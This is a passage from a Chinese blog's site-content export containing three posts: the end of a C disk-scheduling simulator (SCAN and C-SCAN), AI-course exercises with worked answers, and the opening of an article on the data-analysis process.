<span class="hljs-keyword">int</span> now;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;now);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n SCAN 调度结果：&quot;</span>);<br>    <span class="hljs-keyword">int</span> pos;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;m; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">array</span>[i]&gt;=now)<br>        &#123;<br>            pos=i;<br>            sum+=<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">array</span>[i]-now);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=pos; i&lt;m; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(i!=pos)<br>            sum+=<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">array</span>[i]-<span class="hljs-built_in">array</span>[i<span class="hljs-number">-1</span>]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[i]);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(pos&gt;=<span class="hljs-number">1</span>)<br>        sum+=<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">array</span>[m<span class="hljs-number">-1</span>]-<span class="hljs-built_in">array</span>[pos<span class="hljs-number">-1</span>]);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=pos<span class="hljs-number">-1</span>; i&gt;=<span class="hljs-number">0</span>; i--)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(i)<br>            sum+=<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">array</span>[i]-<span class="hljs-built_in">array</span>[i<span class="hljs-number">-1</span>]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n 移动的总道数：%d\n 平均寻道长度：%f\n&quot;</span>,sum,<span class="hljs-number">1.0</span>*sum/m);<br>&#125;<br><span class="hljs-comment">///循环扫描算法</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CSCAN</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[],<span class="hljs-keyword">int</span> m)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;m; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=i+<span class="hljs-number">1</span>; j&lt;m; j++) <span class="hljs-comment">//对磁道号进行从小到大排列</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">array</span>[i]&gt;<span class="hljs-built_in">array</span>[j])<span class="hljs-comment">//两磁道号之间比较</span><br>            &#123;<br>                <span class="hljs-keyword">int</span> temp=<span class="hljs-built_in">array</span>[i];<br>                <span class="hljs-built_in">array</span>[i]=<span class="hljs-built_in">array</span>[j];<br>                <span class="hljs-built_in">array</span>[j]=temp;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;m; i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n 请输入当前的磁道号： &quot;</span>);<br>    <span class="hljs-keyword">int</span> now;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;now);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n C-SCAN 调度结果：&quot;</span>);<br>    <span class="hljs-keyword">int</span> pos;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;m; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">array</span>[i]&gt;=now)<br>        &#123;<br>            pos=i;<br>            sum+=<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">array</span>[i]-now);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=pos; i&lt;m; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(i!=pos)<br>            sum+=<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">array</span>[i]-<span class="hljs-built_in">array</span>[i<span class="hljs-number">-1</span>]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[i]);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(pos&gt;=<span class="hljs-number">1</span>)<br>        sum+=<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">array</span>[m<span class="hljs-number">-1</span>]-<span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;pos; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(i)<br>            sum+=<span class="hljs-built_in">abs</span>(<span class="hljs-built_in">array</span>[i]-<span class="hljs-built_in">array</span>[i<span class="hljs-number">-1</span>]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,<span class="hljs-built_in">array</span>[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n 移动的总道数：%d\n 平均寻道长度：%f\n&quot;</span>,sum,<span class="hljs-number">1.0</span>*sum/m);<br>&#125;<br><span class="hljs-comment">// 操作界面</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> c;<br>    <span class="hljs-keyword">int</span> count;<br><span class="hljs-comment">//int m=0;</span><br>    <span class="hljs-keyword">int</span> cidao[maxsize];<span class="hljs-comment">//定义磁道号数组</span><br>    <span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> b;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n --------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; 磁盘调度算法模拟&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n --------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请先输入磁道数量： \n&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;b);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请先输入磁道序列： \n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;b; i++)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;cidao[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n 磁道读取结果： \n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;b; i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,cidao[i]);<span class="hljs-comment">//输出读取的磁道的磁道号</span><br>    &#125;<br>    count=b;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n &quot;</span>);<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n 算法选择： \n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; 1、先进先出算法（ FIFO） \n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; 2、最短服务时间优先算法（ SSTF） \n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; 3、扫描算法（ SCAN） \n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; 4、循环扫描算法（ C-SCAN） \n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; 5. 退出\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请选择： &quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;c);<br>        <span class="hljs-keyword">if</span>(c&gt;<span class="hljs-number">5</span>)<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">switch</span>(c)<span class="hljs-comment">//算法选择</span><br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            FIFO(cidao,count);<span class="hljs-comment">//先进先出算法</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            SSTF(cidao,count);<span class="hljs-comment">//最短服务时间优先算法</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            SCAN(cidao,count);<span class="hljs-comment">//扫描算法</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            CSCAN(cidao,count);<span class="hljs-comment">//循环扫描算法</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> 课程设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能练习题</title>
      <link href="/2021/06/30/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
      <url>/2021/06/30/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E7%BB%83%E4%B9%A0%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="人工智能导论练习题（第二版-有答案）"><a href="#人工智能导论练习题（第二版-有答案）" class="headerlink" title="人工智能导论练习题（第二版-有答案）"></a>人工智能导论练习题（第二版-有答案）</h2><h3 id="第三章-图搜索与问题求解"><a href="#第三章-图搜索与问题求解" class="headerlink" title="第三章 图搜索与问题求解"></a>第三章 图搜索与问题求解</h3><ol><li><p>设有如图所示的一棵与或树，请指出解树；并分别按和代价及最大代价求解树代价；然后指出<br> 最优解树。</p><p><img src="/images/python/image-20210630220143020.png" alt="1图"></p></li></ol><p>题解：</p><p>该与或树有两棵解树，其一由 S0、A、D、t1、t2、t3 组成；另一 棵由 S0、B、E、t4、t5组成。</p><p>解树 2 的和代价为 18，最大代价为 14；  解树 1 的和代价为 12，最大代价为 10。  所以，最优解树为解树 2。</p><ol start="2"><li><p>试用与或树描述下面不定积分的求解过程：</p><p><img src="/images/python/image-20210630220217177.png" alt="2图"></p><p>题解：</p><p><img src="/images/python/image-20210702105142567.png" alt="题解"></p></li><li><p>图3 是五大城市间的交通示意图，边上的数字是两城市间的距离。用图搜索技术编写程序，求解<br> 以下问题：<br> (1)任找一条西安到北京的旅行路线，并给出其距离。<br> (2) 找一条从西安到北京，必须途经上海的路径。<br> (3) 找一条从西安到北京，必须途经上海，但不能去昆明的路径。</p><p><img src="/images/python/image-20210630220305575.png" alt="3图"></p></li></ol><p>题解：</p><p>提示：这是一个加权状态图搜索问题，可用 分支界限法或者最近择优法求解。程序可参考 3.2.2 节例 3-11 中的通用程序，但这里open 表中每个状态节点（城市）还需要有代价（距离）项，而且从 open 表中取第一个节点前先要对 open 表中的节点按代价排序。</p><p><img src="/images/python/image-20210702105025464.png" alt="1"></p><p><img src="/images/python/image-20210702105042053.png" alt="2"></p><ol start="4"><li><p>有一农夫带一只狼、一只羊和一筐菜欲从河的左岸乘船到右岸，但受下列条件限制：<br> (1) 船太小，农夫每次只能带一样东西过河；<br> (2) 如果没有农夫看管，则狼要吃羊，羊要吃菜。<br> 设计一个过河方案， 使得农夫、狼、羊、菜都能不受损失地过河。画出相应的状态变化图。<br> 提示： (1) 用四元组(农夫、狼、羊、菜)表示状态，其中每个元素都可为0或1，用0表示在左岸，<br> 用1表示在右岸。<br> (2) 把每次过河的一种安排作为一个算符，每次过河都必须有农夫，因为只有他可以划<br> 船。</p><p>题解：</p><p>方案一：Step1 农夫带羊过河；</p><p>​         Step2 农夫返回带菜过河 </p><p>​         Step3 农夫带羊回去，然后带狼过河；</p><p>​         Step4 农夫返回带羊过河；</p><p>​         设  A 农夫，B 羊，C 狼，D 菜，初始状态为（A0,B0,C0,D0）（未过河），最终状态为（A1, B1, C1, D1）(已过河） 。则相应的状态变化图如下： </p><p><img src="/images/python/image-20210702104629400.png" alt="题解1"></p><p>方案 2：Step1：农夫带羊过河；</p><p>​              Step2：农夫返回带狼过河；</p><p>​              Step3：农夫带羊返回去，然后把菜带过河；</p><p>​              Step4：农夫回去带羊过河；  则相应的状态变化图为：</p><p><img src="/images/python/image-20210702104820501.png" alt="题解2"></p></li><li><p>设有三只琴键开关一字排开，初始状态为“关、开、关”，问连按三次后是否会出现“开、 开、开”或<br> “关、关、关”的状态？<br> 要求每次必须按下一个开关，而且只能按一个开关。<br> 另外，画出这个琴键开关的状态空间图。<br> 注： 琴键开关有这样的特点，若第一次按下时它为“开”，则第二次按下时它就变成了“关”。</p><p>题解：</p><p><img src="/images/python/image-20210702111517149.png" alt="题解"></p></li></ol><h3 id="第四章-基于遗传算法的随机优化搜索"><a href="#第四章-基于遗传算法的随机优化搜索" class="headerlink" title="第四章 基于遗传算法的随机优化搜索"></a>第四章 基于遗传算法的随机优化搜索</h3><ol><li><p>举例说明遗传算法中的三种遗传操作。</p><p>题解：</p><p><img src="/images/python/image-20210702111933771.png" alt="题解"></p><p><img src="/images/python/image-20210702111956672.png" alt="题解"></p></li><li><p>画出基本遗传算法的流程图</p><p>题解：</p><p><img src="/images/python/image-20210702111728363.png" alt="题解"></p></li></ol><h3 id="第五章-基于一阶谓词的机器推理"><a href="#第五章-基于一阶谓词的机器推理" class="headerlink" title="第五章 基于一阶谓词的机器推理"></a>第五章 基于一阶谓词的机器推理</h3><ol><li><p>将下列句子用一阶谓词形式表示。<br> (1)雪是白的。<br> (2)数a和数b之和大于数c。<br> (3) 201班的学生每人都有一台笔记本电脑。<br> (4)如果明天天气晴朗且我们有时间，则我们去郊游。<br> (5)一个三角形是等腰三角形，当且仅当其有两个角相等。</p><p>题解：</p><p><img src="/images/python/image-20210702105338375.png" alt="题解"></p></li><li><p>求下列谓词公式的子句集。</p><p><img src="/images/python/image-20210630220522087.png" alt="4图"></p><p>题解：</p><p><img src="/images/python/image-20210702105422303.png" alt="题解"></p><p><img src="/images/python/image-20210702105457052.png" alt="题解"></p><p><img src="/images/python/image-20210702105513353.png" alt="题解"></p></li><li><p>试判断下列子句集中哪些是不可满足的。</p><p><img src="/images/python/image-20210630220550609.png" alt="5图"></p><p>题解：</p><p><img src="/images/python/image-20210702105859505.png" alt="题解1"></p><p><img src="/images/python/image-20210702105917510.png" alt="题解2"></p><p><img src="/images/python/image-20210702105939547.png" alt="题解3"></p><p><img src="/images/python/image-20210702110001783.png" alt="题解4"></p><p><img src="/images/python/image-20210702110026718.png" alt="题解5"></p></li><li><p>对下列各题分别证明，G是否可肯定是F，F1，F2，…的逻辑结论。</p><p><img src="/images/python/image-20210630220613004.png" alt="6图"></p><p>题解：</p><p><img src="/images/python/image-20210702110056512.png" alt="题解1"></p><p><img src="/images/python/image-20210702110116653.png" alt="题解2"></p><p><img src="/images/python/image-20210702110136691.png" alt="题解3"></p></li><li><p>设已知：</p><p>(1) 凡是清洁的东西就有人喜欢；<br>(2) 人们都不喜欢苍蝇。<br>  试用谓词公式表示这两个命题，并用归结原理证明：苍蝇是不清洁的。</p><p>题解：</p><p><img src="/images/python/image-20210702110223409.png" alt="题解"></p><p><img src="/images/python/image-20210702110245553.png" alt="题解"></p></li><li><p>某公司招聘工作人员，有A, B, C三人应聘，经面试后，公司表示如下想法：<br> (1) 三人中至少录取一人；<br> (2) 如果录取A而不录取B，则一定录取C；<br> (3) 如果录取B，则一定录取C。<br> 试用谓词公式表示这三个命题，并用归结原理求证：公司一定录取C。</p><p>题解：</p><p><img src="/images/python/image-20210702110317674.png" alt="题解"></p></li><li><p>张某被盗，公安局派出五个侦察员去调查。<br> 研究案情时，侦察员A说“赵与钱中至少有一人作案”；<br>侦察员B说“钱与孙中至少有一人作案”；<br> 侦察员C说“孙与李中至少有一人作案”；<br> 侦察员D说“赵与孙中至少有一人与此案无关”；<br> 侦察员E说“钱与李中至少有一人与此案无关”。<br> 假设这五个侦察员的话都是可信的，用谓词公式表示这五句话，并用归结原理推出谁是盗窃犯。</p><p>题解：</p><p><img src="/images/python/image-20210702110346051.png" alt="题解"></p><p><img src="/images/python/image-20210702110402848.png" alt="题解"></p></li><li><p>试画出例5-28 的（线性）归结演绎树。</p><p><img src="/images/python/image-20210630220955740.png" alt="例5-28"></p><p>题解：</p><p><img src="/images/python/image-20210702110426304.png" alt="题解"></p></li></ol><h3 id="第六章-基于产生式规则的机器推理"><a href="#第六章-基于产生式规则的机器推理" class="headerlink" title="第六章 基于产生式规则的机器推理"></a>第六章 基于产生式规则的机器推理</h3><p>试将本章给出的正向推理和反向推理算法用PROLOG语言或其他语言编程，实现一个推理机。</p><h3 id="第七章-几种结构化知识表示及其推理"><a href="#第七章-几种结构化知识表示及其推理" class="headerlink" title="第七章 几种结构化知识表示及其推理"></a>第七章 几种结构化知识表示及其推理</h3><ol><li><p>用三元组表示下列命题。 (1)雪是白的。 (2)小张身高1.80米。</p><p>题解：</p><p>(1) （雪，颜色，白）</p><p>(2) （小张，身高，1.80）</p></li><li><p>试写出“学生框架”的描述，并用PROLOG语言实现</p><p>题解：</p><p><img src="/images/python/image-20210702110545995.png" alt="题解"></p></li><li><p>请把下列命题表示的事实用一个语义网络表示出来，并用PROLOG语言实现。<br> (1) 树和草都是植物；<br> (2) 树和草都是有根有叶的；<br> (3) 水草是草，且长在水中；<br> (4) 果树是树，且会结果；<br> (5) 樱桃树是一种果树，它结樱桃。</p><p>题解：</p><p><img src="/images/python/image-20210702110613529.png" alt="题解"></p></li></ol><h3 id="第八章-不确定和不确切性知识的表示与推理"><a href="#第八章-不确定和不确切性知识的表示与推理" class="headerlink" title="第八章 不确定和不确切性知识的表示与推理"></a>第八章 不确定和不确切性知识的表示与推理</h3><ol><li><p>举一个不确定性产生式规则实例，并用附有信度的规则形式表示，进而PROLOG语言表示。</p><p>  题解：</p><p>  <img src="/images/python/image-20210702110710073.png" alt="题解"></p></li><li><p>举一个不确切性产生式规则实例，并用程度化规则形式表示，进而PROLOG语言表示。</p><p>  题解:</p><p>  <img src="/images/python/image-20210702110738282.png" alt="题解"></p></li><li><p>写一个程度化框架和一个程度化语义网络，并用PROLOG语言表示。</p><p>  题解：</p><p>  <img src="/images/python/image-20210702110802597.png" alt="题解"></p></li><li><p>试写出天气“热”、“温和”、“冷”这三个软语言值的相容函数。</p><p>  题解：</p><p>  <img src="/images/python/image-20210702110832873.png" alt="题解"></p></li><li><p>设有如下一组规则：<br>  r1: If E1Then E2(0.6)</p><pre><code>r2: If E2 and E3 Then E4(0.8)r3: If E4 Then H(0.7)r4: If E5 Then H(0.9)且已知 CF(E1)＝0.5，CF(E3)＝0.6，CF(E5)＝0.4用确定性理论求CF(H)。</code></pre><p>  题解：</p><p>  <img src="/images/python/image-20210702110900371.png" alt="题解"></p></li><li><p>写出例8-11中软语言值“低”和“高”的相容函数。</p><p><img src="/images/python/image-20210630221738639.png" alt="例8-11"></p><p>题解：</p><p><img src="/images/python/image-20210702110923576.png" alt="题解"></p></li></ol><h3 id="第九章-机器学习：符号学习与交互学习"><a href="#第九章-机器学习：符号学习与交互学习" class="headerlink" title="第九章 机器学习：符号学习与交互学习"></a>第九章 机器学习：符号学习与交互学习</h3><ol><li><p>通过计算条件熵，完成9.3.3节例子中根节点以下节点的选择，并验证原所得决策树是否最简。</p><p>题解：</p><p><img src="/images/python/image-20210702111011202.png" alt="题解"></p><p><img src="/images/python/image-20210702111035520.png" alt="题解"></p><p><img src="/images/python/image-20210702111052313.png" alt="题解"></p></li><li><p>完成9.4.2节中图9-19中其余动作Q’值的更新，并给出一个最优策略*。</p><p><img src="/images/python/image-20210630221502600.png" alt="图9-19"></p><p>题解：</p><p><img src="/images/python/image-20210702111128476.png" alt="题解"></p></li></ol><blockquote><p>在此感谢老王的辛勤付出，为我们摘录了题目！©老王</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>站在数据分析师的角度谈谈对数据的处理方法</title>
      <link href="/2021/06/30/%E7%AB%99%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B8%88%E7%9A%84%E8%A7%92%E5%BA%A6%E8%B0%88%E8%B0%88%E5%AF%B9%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E7%9A%84%E6%96%B9%E6%B3%95/"/>
      <url>/2021/06/30/%E7%AB%99%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B8%88%E7%9A%84%E8%A7%92%E5%BA%A6%E8%B0%88%E8%B0%88%E5%AF%B9%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>淘宝卖家数据显示：</p><p>胸最大的是新疆妹子，国内内衣消费最多的SIZE是B；</p><p>其中75B销量最好，占比41.45%，其次是A，占比 25.26%；</p><p>各种颜色中，黑色最为畅销，因为百搭。</p><p>…………</p><p>这些早已应用在内衣生产、备货、销售等关键环节。</p><p>网易云音乐数据显示：</p><p>90后用户占比高达59%，其次是80后（12%）；</p><p>除了流行歌曲，用户最喜欢的风格竟是电音，其中又以广东用户对电音最为热爱；</p><p>最青睐民谣的省份是：甘肃&amp;陕西，最喜欢舞曲的是新疆朋友；</p><p>小众音乐主要聚集在北上广深；</p><p>…………</p><p>这些数据也服务于网易云音乐的个性化推荐系统</p><p>但数据分析的应用还远不止如此，利用数据分析的方法，我们还可以得到很多有意思的结论。</p><p>比如谷歌的数据分析可以预测一个地区即将爆发的流感，从而进行针对性的预防；淘宝可以根据你浏览和消费的数据进行分析，为你精准推荐商品；口碑极好的网易云音乐，通过其相似性算法，为不同的人量身定制每日歌单……</p><p>数据正在变得越来越常见，而数据分析的价值也越来越凸显。在大型互联网企业（比如谷歌、阿里、腾讯、等）每天将产生海量的数据；就算是初创的互联网公司，日志、用户、运营等数据量也不可小觑；而一大波传统企业，在普及智能终端的情况下，所产生的数据，也非同小可。那么一个比较完善的数据分析流程是什么样的呢？</p><h2 id="1-问题定义"><a href="#1-问题定义" class="headerlink" title="1.问题定义"></a>1.问题定义</h2><p>比较典型的场景是我们需要针对企业的数据进行分析，比如公司通常会有销售数据、用户数据、运营数据、产品生产数据……你需要从这些数据里获得哪些有用的信息，对策略的制定进行指导呢？又比如你需要做的是一份市场调研或者行业分析，那么你需要知道你需要获得关于这个行业的哪些信息。</p><p>首先你需要确定去分析的问题是什么？你想得出哪些结论？</p><p>比如某地区空气质量变化的趋势是什么？</p><p>王者荣耀玩家的用户画像是什么样的？经常消费的是那类人？</p><p>影响公司销售额增长的关键因素是什么？</p><p>生产环节中影响产能和质量的核心指标是什么？</p><p>如何对分析用户画像并进行精准营销？</p><p>如何基于历史数据预测未来某个阶段用户行为？</p><p>…………</p><p>这些问题可能来源于你已有的经验和知识。比如你已经知道每周的不同时间用户购买量不一样，那么你可以通过分析得出销量和时间的精确关系，从而精准备货。又比如你知道北京最近几年的空气质量是在变坏的，可能的因素是工厂排放、沙尘暴、居民排放、天气因素等，那么在定义问题的时候你就需要想清楚，需要针对哪些因素进行重点分析。</p><p>有些问题则并不清晰，比如在生产环节中，影响质量的核心指标是什么，是原材料？设备水平？工人水平？天气情况？某个环节工艺的复杂度？某项操作的重复次数？……这些可能并不明显，或者你是涉足新的领域，并没有非常专业的知识，那么你可能需要定义的问题就需要更加宽泛，涵盖更多的可能性。</p><p>问题的定义可能需要你去了解业务的核心知识，并从中获得一些可以帮助你进行分析的经验。从某种程度上说，这也是我们经常提到的数据思维。数据分析很多时候可以帮助你发现我们不容易发现的相关性，但对问题的精确定义，可以从很大程度上提升数据分析的效率。</p><p>如何更好地定义问题？</p><p>这就需要你在长期的训练中找到对数据的感觉，开始的时候你拿到特别大的数据，有非常多的字段，可能会很懵逼，到底应该从什么地方下手呢？</p><p>但如果有一些经验就会好很多。比如，你要研究影响跑步运动员速度的身体因素，那么我们可能会去研究运动员的身高、腿长、体重、甚至心率、血压、臂长，而不太会去研究运动员的腋毛长度，这是基于我们已有的知识。又比如我们要分析影响一个地方房价的因素，那么我们可能会有一些通用的常识，比如城市人口、地理位置、GDP、地价、物价水平，更深入的可能会有产业格局、文化状态、气候情况等等，但一般我们不会去研究城市的女孩长相，美女占比。</p><p>所以当你分析的问题多了之后，你就会有一些自己对数据的敏感度，从而养成用数据分析、用数据说话的习惯。这个时候你甚至可以基于一些数据，根据自己的经验做出初步的判断和预测（当然是不能取代完整样本的精准预测），这个时候，你就基本拥有数据思维了。</p><h2 id="2-数据获取"><a href="#2-数据获取" class="headerlink" title="2.数据获取"></a>2.数据获取</h2><p>有了具体的问题，你就需要获取相关的数据了。比如你要探究北京空气质量变化的趋势，你可能就需要收集北京最近几年的空气质量数据、天气数据，甚至工厂数据、气体排放数据、重要日程数据等等。如果你要分析影响公司销售的关键因素，你就需要调用公司的历史销售数据、用户画像数据、广告投放数据等。</p><p>数据的获取方式有多种。</p><p>一是公司的销售、用户数据，可以直接从企业数据库调取，所以你需要SQL技能去完成数据提取等的数据库管理工作。比如你可以根据你的需要提取2017年所有的销售数据、提取今年销量最大的50件商品的数据、提取上海、广东地区用户的消费数据……，SQL可以通过简单的命令帮你完成这些工作。</p><p>第二种是获取外部的公开数据集，一些科研机构、企业、政府会开放一些数据，你需要到特定的网站去下载这些数据。这些数据集通常比较完善、质量相对较高。当然这种方式也有一些缺陷，通常数据会发布的比较滞后，但通常因为客观性、权威性，仍然具有很大的价值。</p><p>第三种是编写网页爬虫，去收集互联网上的数据。比如你可以通过爬虫获取招聘网站某一职位的招聘信息，爬取租房网站上某城市的租房信息，爬取豆瓣评分评分最高的电影列表，获取知乎点赞排行、网易云音乐评论排行列表。基于互联网爬取的数据，你可以对某个行业、某种人群进行分析，这算是非常靠谱的市场调研、竞品分析的方式了。</p><p>当然，比较BUG的一点是，你通常并不能够获得所有你需要的数据，这对你的分析结果是有一定影响的，但不不影响的是，你通过有限的可获取的数据，提取更多有用的信息。</p><h2 id="3-数据预处理"><a href="#3-数据预处理" class="headerlink" title="3.数据预处理"></a>3.数据预处理</h2><p>现实世界中数据大体上都是不完整，不一致的脏数据，无法直接进行数据分析，或分析结果差强人意。数据预处理有多种方法：数据清理，数据集成，数据变换，数据归约等。把这些影响分析的数据处理好，才能获得更加精确地分析结果。</p><p>比如空气质量的数据，其中有很多天的数据由于设备的原因是没有监测到的，有一些数据是记录重复的，还有一些数据是设备故障时监测无效的。</p><p>那么我们需要用相应的方法去处理，比如残缺数据，我们是直接去掉这条数据，还是用临近的值去补全，这些都是需要考虑的问题。</p><p>当然在这里我们还可能会有数据的分组、基本描述统计量的计算、基本统计图形的绘制、数据取值的转换、数据的正态化处理等，能够帮助我们掌握数据的分布特征，是进一步深入分析和建模的基础。</p><h2 id="4-数据分析与建模"><a href="#4-数据分析与建模" class="headerlink" 